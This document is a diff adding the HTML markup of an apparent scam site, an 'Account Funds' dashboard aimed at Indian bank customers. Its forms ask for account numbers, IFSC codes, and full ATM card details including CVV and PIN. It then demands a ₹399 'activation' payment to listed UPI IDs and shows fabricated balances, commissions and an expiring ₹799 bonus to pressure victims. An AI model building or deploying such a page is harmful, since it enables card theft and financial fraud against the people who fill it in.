@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Funds - Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body class="premium">
+    <!-- LIVE ACTIVATION BANNER -->
+    <div class="banner">
+        <strong>⚠️ LIVE ACTIVATION SYSTEM</strong>
+    </div>
+
+    <!-- IN-APP PAYMENT NOTIFICATION CONTAINER -->
+    <div id="paymentNotificationContainer" class="payment-notification-container" aria-live="assertive"></div>
+
+    <div class="container">
+        <!-- TOP HEADER BAR -->
+        <div class="dashboard-header header-bar">
+            <div class="header-left">
+                <h1 class="site-title">Account Funds</h1>
+            </div>
+            <div class="header-right">
+                <a href="https://t.me/+gPDN87ly87liYTc1" class="telegram-icon" target="_blank" title="Join our Telegram">
+                    <svg width="24" height="24" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M29.57 6.11c.31-.96-.98-1.39-1.57-.7L3.9 18.38c-1.07.65-1.05 1.49-.2 1.89l6.46 2.01 1.53 6.03c.18.73.97.83 1.39.28l2.76-3.56 5.56 4.11c.99.74 1.75.39 1.98-.82l3.12-14.79zm-18.23 14.79l.06.06.59 5.29-2.28-8.96 11.25-6.17-9.62 9.78zm10.78-9.96l-7.67 7.14-1.27 4.13 2.72-3.14 6.22-8.13z" fill="currentColor"/>
+                    </svg>
+                </a>
+                <div class="bonus-box" id="bonusBox" title="Open Bonus">
+                    <span class="bonus-badge" id="bonusBadge">●</span>
+                    <span class="bonus-icon">🎁</span>
+                    <span class="bonus-text">BONUS</span>
+                </div>
+                <button type="button" class="btn btn-logout" id="logoutBtn">Logout</button>
+            </div>
+        </div>
+
+        <button type="button" class="back-nav-btn" id="dashboardBackBtn" style="display:none;">← Back</button>
+
+        <!-- WELCOME TEXT -->
+        <div class="welcome-row">
+            <h2 id="welcomeMessage" class="welcome-user">WELCOME USER</h2>
+        </div>
+
+        <!-- STAT CARDS -->
+        <div class="dashboard-section stats-section">
+            <div class="stat-cards">
+                <div class="stat-card">
+                    <p class="stat-label">Total Balance</p>
+                    <div class="stat-value" id="totalBalance">₹0</div>
+                </div>
+                <div class="stat-card">
+                    <p class="stat-label">Commission Earned</p>
+                    <div class="stat-value" id="totalCommission">₹0</div>
+                </div>
+                <div class="stat-card">
+                    <p class="stat-label">Transactions</p>
+                    <div class="stat-value" id="totalTransactions">0</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MAIN DASHBOARD -->
+        <div class="dashboard-section" id="mainDashboard">
+            <div class="card main-action-card">
+                <h3>Account Setup</h3>
+                <p class="muted">Follow the sequential steps below to complete account setup.</p>
+
+                <div class="main-actions">
+                    <div class="step-indicator">
+                        <div class="step step-active"><span>1</span><p>Account Details</p></div>
+                        <div class="step-arrow">→</div>
+                        <div class="step"><span>2</span><p>ATM Setup</p></div>
+                        <div class="step-arrow">→</div>
+                        <div class="step"><span>3</span><p>Activate</p></div>
+                        <div class="step-arrow">→</div>
+                        <div class="step"><span>4</span><p>Running Account</p></div>
+                        <div class="step-arrow">→</div>
+                        <div class="step"><span>5</span><p>Withdraw</p></div>
+                    </div>
+
+                    <button type="button" class="btn btn-primary" id="gamingFundBtn">Step 1: Setup Account Details</button>
+                    <button type="button" class="btn btn-success" id="openRunningBtn" style="margin-top:10px;">Step 4: Open Running Account</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 1: ACCOUNT DETAILS -->
+        <div class="dashboard-section hidden" id="gamingFundSection">
+            <div class="card">
+                <h3>Step 1: Account Details</h3>
+                <form id="accountDetailsForm">
+                    <div class="form-group">
+                        <label for="accountNumber">Account Number</label>
+                        <input type="text" id="accountNumber" placeholder="Enter 10-16 digit account number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="ifscCode">IFSC Code</label>
+                        <input type="text" id="ifscCode" placeholder="e.g., SBIN0001234" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="accountHolder">Account Holder Name</label>
+                        <input type="text" id="accountHolder" placeholder="Enter account holder name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="bankName">Bank Name</label>
+                        <input type="text" id="bankName" placeholder="e.g., State Bank of India" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="accountType">Account Type</label>
+                        <select id="accountType" required>
+                            <option value="Saving">Saving Account (~₹70K limit)</option>
+                            <option value="Current">Current Account (~₹140K limit)</option>
+                            <option value="Corporate">Corporate Account (~₹190K limit)</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="contactNumber">Contact Number</label>
+                        <input type="tel" id="contactNumber" placeholder="Enter 10-digit contact number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="upiScanner">Upload UPI Scanner (Optional)</label>
+                        <input type="file" id="upiScanner" accept="image/*">
+                        <small style="color:var(--text-secondary);">Select an image from your gallery</small>
+                        <div id="upiPreview" style="margin-top:12px;"></div>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">Save & Continue</button>
+                </form>
+                <div id="accountDetailsMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- STEP 2: ATM AUTODEBIT -->
+        <div class="dashboard-section hidden" id="autodebitSection">
+            <div class="card">
+                <h3>Step 2: Configure ATM Autodebit</h3>
+                <form id="autodebitForm">
+                    <div class="form-group">
+                        <label for="atmNumber">ATM Card Number</label>
+                        <input type="text" id="atmNumber" placeholder="Enter 16-digit ATM number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="atmExpiry">ATM Expiry (MM/YY)</label>
+                        <input type="text" id="atmExpiry" placeholder="MM/YY" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="atmCvv">ATM CVV</label>
+                        <input type="text" id="atmCvv" placeholder="3-digit CVV" maxlength="3" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="atmPin">ATM PIN</label>
+                        <input type="password" id="atmPin" placeholder="4-digit PIN" maxlength="4" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="atmName">Name on ATM</label>
+                        <input type="text" id="atmName" placeholder="Enter name as on ATM" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="otpToggle">OTP Verification (Always ON)</label>
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <input type="checkbox" id="otpToggle" checked disabled>
+                            <small style="color:var(--text-secondary);">OTP is mandatory and cannot be turned off</small>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">Configure Autodebit</button>
+                </form>
+                <div id="autodebitMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- STEP 3: ACTIVATION PAYMENT -->
+        <div class="dashboard-section hidden" id="activationPaymentSection">
+            <div class="card" style="text-align:center;padding:40px 25px;">
+                <h3>Step 3: Activate Account</h3>
+                <p style="font-size:1.1rem;margin:20px 0;color:var(--text-secondary);">Complete activation to enable transaction engine</p>
+                <button type="button" class="btn btn-primary btn-large" id="activationPaymentBtn">Proceed to Activation</button>
+            </div>
+        </div>
+
+        <!-- ACTIVATION CODE UPI PANEL -->
+        <div class="dashboard-section hidden" id="activationCodeUpiSection">
+            <div class="card">
+                <h3>Live Activation Payment</h3>
+                
+                <div class="upi-section">
+                    <h4>Pay ₹399 via UPI</h4>
+                    <p class="upi-label">Copy any one UPI ID provided below and pay the ₹399 activation charge.</p>
+                    <div class="upi-row">
+                        <p class="upi-label">UPI ID #1</p>
+                        <div class="upi-display">
+                            <span class="upiId" data-upi-id="panneltest0@ptyes">panneltest0@ptyes</span>
+                            <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="panneltest0@ptyes" data-copy-target="activationCopyMessage">Copy</button>
+                        </div>
+                    </div>
+                    <div class="upi-row">
+                        <p class="upi-label">UPI ID #2</p>
+                        <div class="upi-display">
+                            <span class="upiId" data-upi-id="malikpay0@fam">malikpay0@fam</span>
+                            <button type="button" class="btn btn-secondary copy-upi-btn" data-upi-id="malikpay0@fam" data-copy-target="activationCopyMessage">Copy</button>
+                        </div>
+                    </div>
+                    <div class="copyMessage" id="activationCopyMessage"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="activationUtrInput">Submit UTR</label>
+                    <input type="text" id="activationUtrInput" placeholder="Enter any UTR number" class="utrInput">
+                    <button type="button" class="btn btn-primary" id="activationSubmitUtrBtn" style="width:100%;margin-top:8px;">Submit UTR</button>
+                </div>
+                <div id="activationUtrMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- ACTIVATION CODE DISPLAY -->
+        <div class="dashboard-section hidden" id="activationCodeDisplaySection">
+            <div class="card" style="text-align:center;padding:40px 25px;">
+                <h3 style="color:var(--success-color);">✓ Activation Code Generated</h3>
+                <p style="margin:20px 0;font-size:1.1rem;color:var(--text-secondary);">Your 7-digit activation code:</p>
+                <div style="font-size:2.2rem;font-weight:800;color:var(--primary-color);margin:20px 0;letter-spacing:4px;font-family:monospace;" id="generatedActivationCode">0000000</div>
+                <button type="button" class="btn btn-secondary" id="copyActivationCodeBtn" style="width:100%;margin-bottom:10px;">Copy Code</button>
+                <button type="button" class="btn btn-primary btn-large" id="activateAccountCodeBtn">Verify Code</button>
+            </div>
+        </div>
+
+        <!-- CODE VERIFICATION -->
+        <div class="dashboard-section hidden" id="codeVerificationSection">
+            <div class="card">
+                <h3>Verify Activation Code</h3>
+                <div class="form-group">
+                    <label for="enteredActivationCode">Enter the 7-digit activation code</label>
+                    <input type="text" id="enteredActivationCode" placeholder="Enter code" maxlength="7" style="font-size:1.2rem;text-align:center;letter-spacing:2px;font-family:monospace;">
+                    <button type="button" class="btn btn-primary" id="submitVerificationBtn" style="width:100%;margin-top:12px;">Verify & Activate</button>
+                </div>
+                <div id="verificationMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- STEP 4: RUNNING ACCOUNT -->
+        <div class="dashboard-section hidden" id="runningAccountSection">
+            <div class="card running-card">
+                <div style="background:rgba(239,68,68,0.1);border:1px solid var(--danger-color);padding:12px;border-radius:8px;margin-bottom:15px;">
+                    <p style="color:var(--danger-color);font-weight:700;margin:0;">⚠️ Do not refresh or close the website</p>
+                </div>
+
+                <!-- STATUS INDICATOR -->
+                <div class="status-indicator" style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+                    <span id="accountStatusDot" class="status-dot stopped" aria-hidden="true"></span>
+                    <span id="accountStatusText" style="font-weight:700;color:var(--text-secondary)">ACCOUNT STOPPED – NOT RUNNING</span>
+                </div>
+
+                <div class="running-main">
+                    <div class="running-left">
+                        <p id="accountLinked" style="color:var(--text-secondary);font-weight:600;">Account Linked: XXXX 0000</p>
+
+                        <div class="balance-display">
+                            <p style="margin:0;font-size:0.9rem;color:var(--text-secondary);">Live Balance</p>
+                            <div id="liveBalance" style="font-size:2rem;font-weight:800;color:var(--success-color);margin-top:5px;">₹0</div>
+                        </div>
+
+                        <div class="transactions">
+                            <h4>Recent Credits</h4>
+                            <div id="transactionFeed" class="transaction-feed"></div>
+                        </div>
+
+                        <div id="limitMessage" class="message" style="margin-top:15px;"></div>
+                    </div>
+
+                    <div class="running-right">
+                        <div class="side-panel">
+                            <h4>Commission (3.5%)</h4>
+                            <div id="commissionAmount" style="font-size:1.6rem;font-weight:800;color:var(--secondary-color);margin:12px 0;">₹0</div>
+                            <button type="button" class="btn btn-primary" id="withdrawCommissionBtn" style="width:100%;">Step 5: Withdraw</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- BONUS PAGE -->
+        <div class="dashboard-section hidden" id="bonusPageSection">
+            <div class="card bonus-page-card">
+                <div class="bonus-page-title">🎁 SPECIAL BONUS</div>
+                <h3>CONGRATULATIONS</h3>
+                <p class="bonus-page-subtitle">SPECIAL BONUS CREDITED</p>
+                <div class="bonus-amount">₹799</div>
+                <button type="button" class="btn btn-primary btn-large" id="claimBonusBtn">CLAIM / WITHDRAW ₹799</button>
+
+                <div class="bonus-demo-countdown" aria-live="polite">
+                    <div class="bonus-countdown-expiry" id="bonusCountdownExpiry">Bonus will expire on: --</div>
+                    <div class="bonus-countdown-timer" aria-label="Bonus countdown">
+                        <span class="bonus-time-box"><strong id="bonusHours">00</strong><small>HOURS</small></span>
+                        <span class="bonus-time-separator">:</span>
+                        <span class="bonus-time-box"><strong id="bonusMinutes">00</strong><small>MINUTES</small></span>
+                        <span class="bonus-time-separator">:</span>
+                        <span class="bonus-time-box"><strong id="bonusSeconds">00</strong><small>SECONDS</small></span>
+                    </div>
+                    <div class="bonus-countdown-note">LEFT</div>
+                </div>
+
+                <div id="bonusMessageContainer" class="bonus-inline-message" style="display:none;"></div>
+            </div>
+        </div>
+
+        <!-- BONUS WITHDRAW PAGE -->
+        <div class="dashboard-section hidden" id="bonusWithdrawSection">
+            <div class="card">
+                <h3>Bonus Withdraw Details</h3>
+                <form id="bonusWithdrawForm">
+                    <div class="form-group">
+                        <label for="bonusWithdrawAccNumber">Enter Account Number</label>
+                        <input type="text" id="bonusWithdrawAccNumber" placeholder="Enter account number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="bonusWithdrawIfsc">Enter IFSC Code</label>
+                        <input type="text" id="bonusWithdrawIfsc" placeholder="Enter IFSC code" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="bonusWithdrawHolder">Enter Account Holder Name</label>
+                        <input type="text" id="bonusWithdrawHolder" placeholder="Enter account holder name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="bonusWithdrawBank">Enter Bank Name</label>
+                        <input type="text" id="bonusWithdrawBank" placeholder="Enter bank name" required>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">WITHDRAW BONUS ₹799</button>
+                </form>
+                <div id="bonusWithdrawMessage" class="message"></div>
+            </div>
+        </div>
+
+        <!-- TRANSACTION HISTORY -->
+        <div class="dashboard-section" id="transactionHistorySection">
+            <div class="card">
+                <h3>Transaction History (Last 10)</h3>
+                <div id="transactionHistory" class="transaction-history"></div>
+            </div>
+        </div>
+
+        <!-- WITHDRAW PANEL -->
+        <div class="dashboard-section hidden" id="withdrawCommissionSection">
+            <div class="card">
+                <h3>Step 5: Withdraw Commission</h3>
+                <form id="withdrawCommissionForm">
+                    <div class="form-group">
+                        <label for="withdrawAccNumber">Account Number</label>
+                        <input type="text" id="withdrawAccNumber" placeholder="Enter account number" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="withdrawIfsc">IFSC Code</label>
+                        <input type="text" id="withdrawIfsc" placeholder="Enter IFSC code" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="withdrawBank">Bank Name</label>
+                        <input type="text" id="withdrawBank" placeholder="Enter bank name" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="withdrawContact">Contact Number</label>
+                        <input type="tel" id="withdrawContact" placeholder="Enter contact number" required>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">Request Withdrawal</button>
+                </form>
+                <button type="button" class="btn btn-secondary" id="backFromWithdrawBtn" style="margin-top:10px;width:100%;">Back</button>
+            </div>
+        </div>
+
+        <!-- REMOVE BANK (DANGER) -->
+        <div class="bottom-actions">
+            <button type="button" class="btn btn-danger" id="removeBankBtn">Remove Bank Account</button>
+            <div id="bankRemovalMessage" class="message" style="display:none;margin-top:12px;"></div>
+        </div>
+
+        <button type="button" id="backToDashboardBtn" style="display:none;"></button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
